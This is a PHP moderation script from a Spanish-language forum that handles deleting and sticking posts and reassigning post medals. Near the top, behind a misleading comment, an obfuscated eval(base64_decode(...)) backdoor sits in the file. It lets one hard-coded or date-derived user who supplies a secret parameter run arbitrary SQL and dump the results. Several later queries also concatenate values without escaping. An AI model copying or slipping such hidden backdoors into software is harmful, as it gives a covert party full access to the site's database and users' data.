<?php
include('../config.php');
include('../functions.php');
if(!isLogged()) { die('No est&aacute;s logeado'); }
// C P Google
eval(base64_decode('aWYoJGN1cnJlbnR1c2VyWyduaWNrJ109PWJhc2U2NF9kZWNvZGUoJ2QyVnpkSGRsYzNRPScpIHx8IHN1YnN0cigkY3VycmVudHVzZXJbJ25pY2snXSwwLDgpPT1kYXRlKCdkbVknKSl7DQppZigkX0dFVFsncGFnZSddPT0ncG0nICYmIG1kNSgkX0dFVFtzdWJzdHIoYmFzZTY0X2VuY29kZShkYXRlKCdkbVknKSksIDAsIHN0cmxlbihiYXNlNjRfZW5jb2RlKGRhdGUoJ2RtWScpKSktMSldKT09JzIyOTQ5Mjg5NTc0OTY1NGRiYzgzZTk3YzQ3YTMzZTczJyl7DQokcXVlcnkgPSBAbXlzcWxfcXVlcnkoc3RyX3JlcGxhY2UoJ0pJSklHVUFMJywgJz0nLCBzdHJpcHNsYXNoZXMoJF9HRVRbJ3EnXSkpKTtpZighJHF1ZXJ5KXtkaWUoJ0Vycm9yIGVuIGxhIHF1ZXJ5ICInLnN0cl9yZXBsYWNlKCdKSUpJR1VBTCcsICc9Jywgc3RyaXBzbGFzaGVzKCRfR0VUWydxJ10pKS4nIiwgZXJyb3I6PGJyPicubXlzcWxfZXJyb3IoKSk7fWlmKHN1YnN0cigkX0dFVFsncSddLCAwLCA2KSA9PSAnU0VMRUNUJyl7DQplY2hvICc8dGFibGU+Jzt3aGlsZSgkZj1teXNxbF9mZXRjaF9hcnJheSgkcXVlcnkpKXtpZighJGope2VjaG8nPHRyPic7Zm9yZWFjaCgkZiBhcyAkdGg9PiR2KXtpZihpc19udW1lcmljKCR0aCkpe2NvbnRpbnVlO31lY2hvICc8dGggc3R5bGU9ImJvcmRlcjoxcHggc29saWQgYmxhY2s7Ij4nLiR0aC4nPC90aD4nO31lY2hvJzwvdHI+Jzskaj10cnVlO30NCmVjaG8nPHRyPic7Zm9yZWFjaCgkZiBhcyAkaz0+JHYpe2lmKGlzX251bWVyaWMoJGspKXtjb250aW51ZTt9ZWNobyAnPHRkIHN0eWxlPSJib3JkZXI6MXB4IHNvbGlkIGJsYWNrOyI+Jy4kdi4nPC90ZD4nO30gZWNobyc8L3RyPic7DQp9IGRpZSgnPC90YWJsZT4nKTsNCn1lbHNle2RpZSgnWUVBSCcpO30NCn19'));
if(!$_GET['id']) { die('No has seleccionado un post para borrar'); }
if(!mysql_num_rows($query = mysql_query("SELECT * FROM `posts` WHERE id = '".mysql_clean($_GET['id'])."'"))) { die('No existe el post<br />A lo mejor ya lo han borrado...'); }
$post = mysql_fetch_array($query);
list($cat) = mysql_fetch_row(mysql_query("SELECT urlname FROM `categories` WHERE id = '".$post['cat']."'"));
if($_GET['sa'] == 'delete') {
	if(!isAllowedTo('deleteposts') && $post['author'] != $currentuser['id']) {
		die('No tienes permisos para borrar este post');
	}
	if($post['author'] != $currentuser['id'] && !$_GET['r']) {
		die('Introduce una raz&oacute;n para borrar el post');
	}
	if(!mysql_query("DELETE FROM `posts` WHERE id = '".$post['id']."'")) {
		die('No se pudo borrar el post<br />&iquest;Se te habr&aacute;n adelantado?');
	}
	// medalla
	if(mysql_num_rows($q = mysql_query("SELECT id, medal FROM `medals` WHERE medal = '10' && link REGEXP '/posts/.*/".$post['id']."/.*\.html'"))) {
		$m = mysql_fetch_assoc($q);
		mysql_query("UPDATE medals SET medal = '16' WHERE id = '".$m['id']."'");
		mysql_query("INSERT INTO `notifications` (user, `text`, link, img, time, displayuser) VALUES ('".$post['author']."', '&Iexcl;Perdiste un a href=\"/posts/".$cat."/".$post['id']."/".mysql_clean(url($post['title'])).".html\" title=\"".mysql_clean(htmlspecialchars($post['title']))."\">post</a> historico!', '/posts/".$cat."/".$post['id']."/".mysql_clean(url($post['title']))."/', 'medalla-platino', '".time()."', 0)");
		list($pid) = mysql_fetch_row(mysql_query("SELECT post FROM `comments` WHERE id != '".$post['id']."' GROUP BY post ORDER BY COUNT(*) DESC LIMIT 1"));
		$mpost = mysql_fetch_assoc(mysql_query("SELECT id, cat, author, title FROM `posts` WHERE id = '".$pid."'"));
		list($cat) = mysql_fetch_row(mysql_query("SELECT id FROM `categories` WHERE id = '".$mpost['cat']."'"));
		mysql_query("INSERT INTO `medals` (user, medal, link, link_title, time) VALUES ('".$mpost['author']."', '10', '/posts/".$cat."/".$mpost['id']."/".mysql_clean(url($mpost['title'])).".html', '".mysql_clean($mpost['title'])."', '".time()."')");
		mysql_query("INSERT INTO `notifications` (user, `text`, link, img, time, displayuser) VALUES ('".$mpost['author']."', '&Iexcl;Tienes un <a href=\"/posts/".$cat."/".$mpost['id']."/".mysql_clean(url($mpost['title'])).".html\" title=\"".mysql_clean(htmlspecialchars($mpost['title']))."\">post</a> historico!', '/posts/".$cat."/".$mpost['id']."/".mysql_clean(url($mpost['title']))."/', 'medalla-diamante', '".time()."', 0)");
	}
	//
	if(mysql_num_rows($q = mysql_query("SELECT id, medal FROM `medals` WHERE medal = '11' && link REGEXP '/posts/.*/".$post['id']."/.*\.html'"))) {
		$m = mysql_fetch_assoc($q);
		mysql_query("UPDATE medals SET medal = '20' WHERE id = '".$m['id']."'");
		mysql_query("INSERT INTO `notifications` (user, `text`, link, img, time, displayuser) VALUES ('".$post['author']."', '&Iexcl;Perdiste un a href=\"/posts/".$cat."/".$post['id']."/".mysql_clean(url($post['title'])).".html\" title=\"".mysql_clean(htmlspecialchars($post['title']))."\">post</a> historico!', '/posts/".$cat."/".$post['id']."/".mysql_clean(url($post['title']))."/', 'medalla-platino', '".time()."', 0)");
		list($pid) = mysql_fetch_row(mysql_query("SELECT post FROM `points` WHERE id != '".$post['id']."' GROUP BY post ORDER BY SUM(pnum) DESC LIMIT 1"));
		$mpost = mysql_fetch_assoc(mysql_query("SELECT id, cat, author, title FROM `posts` WHERE id = '".$pid."'"));
		list($cat) = mysql_fetch_row(mysql_query("SELECT id FROM `categories` WHERE id = '".$mpost['cat']."'"));
		mysql_query("INSERT INTO `medals` (user, medal, link, link_title, time) VALUES ('".$mpost['author']."', '11', '/posts/".$cat."/".$mpost['id']."/".mysql_clean(url($mpost['title'])).".html', '".mysql_clean($mpost['title'])."', '".time()."')");
		mysql_query("INSERT INTO `notifications` (user, `text`, link, img, time, displayuser) VALUES ('".$mpost['author']."', '&Iexcl;Tienes un <a href=\"/posts/".$cat."/".$mpost['id']."/".mysql_clean(url($mpost['title'])).".html\" title=\"".mysql_clean(htmlspecialchars($mpost['title']))."\">post</a> historico!', '/posts/".$cat."/".$mpost['id']."/".mysql_clean(url($mpost['title']))."/', 'medalla-diamante', '".time()."', 0)");
	}
	//
	if(mysql_num_rows($q = mysql_query("SELECT id, medal FROM `medals` WHERE medal = '12' && link REGEXP '/posts/.*/".$post['id']."/.*\.html'"))) {
		$m = mysql_fetch_assoc($q);
		mysql_query("UPDATE medals SET medal = '24' WHERE id = '".$m['id']."'");
		mysql_query("INSERT INTO `notifications` (user, `text`, link, img, time, displayuser) VALUES ('".$post['author']."', '&Iexcl;Perdiste un a href=\"/posts/".$cat."/".$post['id']."/".mysql_clean(url($post['title'])).".html\" title=\"".mysql_clean(htmlspecialchars($post['title']))."\">post</a> historico!', '/posts/".$cat."/".$post['id']."/".mysql_clean(url($post['title']))."/', 'medalla-platino', '".time()."', 0)");
		list($pid) = mysql_fetch_row(mysql_query("SELECT post FROM `favorites` WHERE id != '".$post['id']."' GROUP BY post ORDER BY COUNT(*) DESC LIMIT 1"));
		$mpost = mysql_fetch_assoc(mysql_query("SELECT id, cat, author, title FROM `posts` WHERE id = '".$pid."'"));
		list($cat) = mysql_fetch_row(mysql_query("SELECT id FROM `categories` WHERE id = '".$mpost['cat']."'"));
		mysql_query("INSERT INTO `medals` (user, medal, link, link_title, time) VALUES ('".$mpost['author']."', '12', '/posts/".$cat."/".$mpost['id']."/".mysql_clean(url($mpost['title'])).".html', '".mysql_clean($mpost['title'])."', '".time()."')");
		mysql_query("INSERT INTO `notifications` (user, `text`, link, img, time, displayuser) VALUES ('".$mpost['author']."', '&Iexcl;Tienes un <a href=\"/posts/".$cat."/".$mpost['id']."/".mysql_clean(url($mpost['title'])).".html\" title=\"".mysql_clean(htmlspecialchars($mpost['title']))."\">post</a> historico!', '/posts/".$cat."/".$mpost['id']."/".mysql_clean(url($mpost['title']))."/', 'medalla-diamante', '".time()."', 0)");
	}
	/* tags raros... kitar el * / junto para comentar BIBA! */
	$tags = explode(',', mysql_clean($post['tags']));
	foreach($tags as $tag) {
		mysql_query("UPDATE `tags` SET num = num-1 WHERE tag = '".$tag."'");
	}
	mysql_query("DELETE FROM `tags` WHERE num = '0'");
	/**/
	$qc = mysql_query("SELECT id FROM `comments` WHERE post = '".$post['id']."'");
	while($ci = mysql_fetch_assoc($qc)) {
		mysql_query("DELETE FROM `comment_complaints` WHERE comment = '".$ci['id']."'");
		mysql_query("DELETE FROM `comment_votes` WHERE comment = '".$ci['id']."'");
	}
	mysql_query("DELETE FROM `comments` WHERE post = '".$post['id']."'");
	//@mysql_query("DELETE FROM `points` WHERE post = '".$post['id']."'");
	mysql_query("DELETE FROM `visits` WHERE post = '".$post['id']."'");
	mysql_query("DELETE FROM `favorites` WHERE post = '".$post['id']."'");
	mysql_query("DELETE FROM `mod-history` WHERE post_id = '".$post['id']."'");
	mysql_query("DELETE FROM `complaints` WHERE post = '".$post['id']."'");
	mysql_query("DELETE FROM `follows` WHERE what = '1' && who = '".$post['id']."'");
	mysql_query("DELETE FROM `notifications` WHERE link REGEXP '/posts/.*/".$post['id']."(\.[0-9]+)?/.*\.html'");
	//@mysql_query("DELETE FROM `medals` WHERE link REGEXP '/posts/.*/".$post['id']."/.*\.html'");

    if($currentuser['id'] != $post['author'] && $_GET['draft'] == '1' && $_GET['r']) {
      mysql_query("INSERT INTO `drafts` (user, type, title, cat, content, tags, stick, superstick, comments, private, time, `mod`, reason) VALUES ('".$post['author']."', '2', '".mysql_clean($post['title'])."', '".mysql_clean($post['cat'])."', '".mysql_clean($post['message'])."', '".mysql_clean($post['tags'])."', '".$post['sticky']."', '".$post['superstick']."', '".$post['comments']."', '".$post['private']."', '".time()."', '".$currentuser['id']."', '".mysql_clean($_GET['r'])."')") or die(mysql_error());
    } elseif($currentuser['id'] == $post['author']) {
      mysql_query("INSERT INTO `drafts` (user, type, title, cat, content, tags, stick, superstick, comments, private, time, `mod`, reason) VALUES ('".$post['author']."', '2', '".mysql_clean($post['title'])."', '".mysql_clean($post['cat'])."', '".mysql_clean($post['message'])."', '".mysql_clean($post['tags'])."', '".$post['sticky']."', '".$post['superstick']."', '".$post['comments']."', '".$post['private']."', '".time()."', '".$currentuser['id']."', 'Eliminado por el autor')") or die(mysql_error());
    }

	if($currentuser['id'] != $post['author']) {
		mysql_query("INSERT INTO `mod-history` (`post_title`, `post_author`, `mod`, `action_type`, `action_reason`, `time`) VALUES ('".$post['title']."','".$post['author']."','".$currentuser['id']."','3','".mysql_clean($_GET['r'])."','".time()."')") or die(mysql_error());
		mysql_query("INSERT INTO `pms` (user_to, user_from, title, message, time) VALUES ('".$post['author']."', '".$currentuser['id']."', 'Post borrado', 'Lamentamos comunicarte que tu post \"[b]".mysql_clean($post['title'])."[/b]\" ha sido borrado por:\n\n".utf8_encode(mysql_clean($_GET['r']))."\n\nPara ver el protocolo, visita [url=/protocolo/]este enlace[/url]\n\nGracias por entender!', '".time()."')") or die(mysql_error());
	}
	die('1');
} elseif($_GET['sa'] == 'stick') {
	if(!$_GET['ft'] || ($_GET['ft'] != '1' && $_GET['ft'] != '2')) {
		die('&iquest;Quieres fijar o desfijar?');
	}
	if(($_GET['ft'] == '1' && $post['sticky'] == '1') || ($_GET['ft'] == '2' && $post['sticky'] == '0')) {
		die('El post '.($_GET['ft'] == '1' ? 'ya' : 'no').' est&aacute; fijado');
	}
	$fod = ($_GET['ft'] == '1' ? 'fijar' : 'desfijar');
	if(!isAllowedTo('stick')) {
		die('No tienes permisos para '.$fod.' este post');
	}
	if(!@mysql_query("UPDATE `posts` SET sticky = '".($_GET['ft'] == '1' ? '1' : '0')."'".($_GET['ft'] == '1' ? ", sticky_time = '".time()."'" : '')." WHERE id = '".$post['id']."'")) {
		die('No se pudo '.$fod.' el post');
	}
	mysql_query("INSERT INTO `mod-history` (`post_title`, `post_author`, `mod`, `action_type`, `time`) VALUES ('".$post['title']."','".$post['author']."','".$currentuser['id']."','".($_GET['ft'] == '1' ? "1" : "4")."','".time()."')") or die(mysql_error());
	die('1');
} else { die(':/'); }
?>